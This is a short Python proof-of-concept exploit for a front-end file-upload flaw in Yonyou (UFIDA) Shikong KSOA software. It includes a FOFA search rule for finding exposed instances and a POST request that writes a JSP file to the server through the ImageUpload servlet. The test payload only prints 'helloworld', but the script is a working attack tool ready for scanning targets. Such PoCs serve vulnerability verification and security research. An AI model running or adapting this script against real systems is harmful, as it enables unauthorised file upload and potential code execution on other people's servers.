#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import re
from urllib import response
import requests
#from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()
# 脚本信息
######################################################
NAME = 'seeyou_UFIDA_fileupload'
AUTHOR = "JDQ"
REMARK = 'FIDA用友时空KSOA软件前台文件上传漏洞'
FOFA_RULE = 'app="用友-时空KSOA"'
######################################################

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
}
data = '''
<% out.println("helloworld"); %>


'''


def poc(target):
    try:
        r = requests.post(target+'/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=111.jsp',data=data,
                          headers=headers, verify=False, timeout=5)
        if r.status_code == 200:
            print("[+] 目标 {} 存在漏洞".format(target)+r.text)
            print(r.text)

    except Exception as e:
        pass


if __name__ == '__main__':
    poc("http://127.0.0.1")
